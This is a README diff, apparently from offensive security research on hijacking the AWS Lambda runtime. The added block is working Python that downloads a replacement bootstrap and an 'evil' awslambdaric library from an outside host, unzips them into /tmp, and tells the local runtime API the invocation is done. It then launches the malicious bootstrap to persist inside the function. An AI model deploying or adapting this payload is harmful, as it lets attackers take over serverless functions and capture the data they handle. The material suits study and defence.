@@ -42,3 +42,34 @@ sys.path.insert(0, '/tmp')
 The source code for postcatcher.php is included in the `php` folder in the root of this repo.
 
 The modified `awslambdaric` library is zipped up and hosted along with the `bootstrap.py` file. The "exploit event" is a python one liner that downloads the `bootstrap.py` and the `awslambdaric` zip file. It unzips the zipped library into tmp along with the bootstrap file and then replaces the running bootstrap with the bootstrap.py from /tmp using our modified library.
+
+The one liner code in a more readable format:
+```
+import zipfile
+import urllib3
+import os
+
+#download new bootstrap.py file and save it to /tmp
+http = urllib3.PoolManager()
+r = http.request('GET', 'https://appointmentaid.com/bootstrap2.py')
+w = open('/tmp/bootstrap.py', 'w')
+w.write(r.data.decode('utf-8'))
+w.close()
+
+#download new awslambdaric and save it to /tmp
+r = http.request('GET', 'https://appointmentaid.com/awslambdaric-evil.zip')
+w = open('/tmp/evil.zip', 'wb')
+w.write(r.data)
+w.close()
+
+#unzip new awslambdaric library to tmp
+zipfile.ZipFile('/tmp/evil.zip', 'r').extractall('/tmp')
+
+#tell lambda api this invocation is done
+r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
+rid = r.headers['Lambda-Runtime-Aws-Request-Id']
+http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'})
+
+#run the new evil bootstrap
+os.system('python3 /tmp/bootstrap.py')
+```
